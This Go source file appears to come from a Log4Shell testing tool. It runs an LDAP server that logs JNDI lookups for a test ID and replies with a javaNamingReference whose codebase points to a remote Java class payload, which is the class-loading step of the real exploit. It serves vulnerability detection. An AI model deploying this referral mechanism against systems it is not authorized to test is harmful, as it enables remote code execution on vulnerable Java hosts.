package main

import (
	"context"
	"fmt"

	ldap "github.com/alexbakker/ldapserver"
	"github.com/alexbakker/log4shell-tools/cmd/log4shell-tools-server/storage"
	"github.com/google/uuid"
	"github.com/lor00x/goldap/message"
	log "github.com/sirupsen/logrus"
)

type LDAPServer struct {
	s     *ldap.Server
	store storage.Backend
}

func NewLDAPServer(store storage.Backend) *LDAPServer {
	s := LDAPServer{store: store}

	mux := ldap.NewRouteMux()
	mux.Bind(s.handleBind)
	mux.Search(s.handleSearch)

	s.s = ldap.NewServer()
	s.s.Handle(mux)
	return &s
}

func (s *LDAPServer) ListenAndServe(addr string) error {
	return s.s.ListenAndServe(addr)
}

func (s *LDAPServer) handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	req := m.GetSearchRequest()

	ctxLog := log.WithFields(log.Fields{
		"server": "ldap",
		"addr":   m.Client.Addr(),
		"req":    "search",
		"object": req.BaseObject(),
	})
	ctxLog.Info("Handling LDAP search request")
	counterSearchRequests.Inc()

	id, err := uuid.Parse(string(req.BaseObject()))
	if err != nil {
		ctxLog.WithError(err).Error("Unable to parse UUID")

		res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultNoSuchObject)
		w.Write(res)
		return
	}
	ctxLog = ctxLog.WithField("test", id)

	test, err := s.store.Test(context.Background(), id)
	if err != nil {
		res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultNoSuchObject)
		w.Write(res)
		return
	}
	if test == nil || test.Done(testTimeout) {
		ctxLog.Warn("Test not found or already done")
		res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultNoSuchObject)
		w.Write(res)
		return
	}

	addr, ptr := getAddrPtr(context.Background(), m.Client.Addr().String())
	if err = s.store.InsertTestResult(context.Background(), test, storage.TestResultLdapSearch, addr, ptr); err != nil {
		ctxLog.WithError(err).Error("Unable to insert test result")
		res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultOther)
		w.Write(res)
		return
	}

	codeBase := fmt.Sprintf("%s://%s/api/tests/%s/payload/", *flagLDAPHTTPProto, *flagHTTPAddrExternal, id)
	e := ldap.NewSearchResultEntry("")
	e.AddAttribute("javaClassName", message.AttributeValue(className))
	e.AddAttribute("javaCodeBase", message.AttributeValue(codeBase))
	e.AddAttribute("objectClass", "javaNamingReference")
	e.AddAttribute("javaFactory", message.AttributeValue(className))
	w.Write(e)

	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}

func (s *LDAPServer) handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	ctxLog := log.WithFields(log.Fields{
		"server": "ldap",
		"addr":   m.Client.Addr(),
		"req":    "bind",
	})
	ctxLog.Info("Handling LDAP bind request")
	counterBindRequests.Inc()

	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}
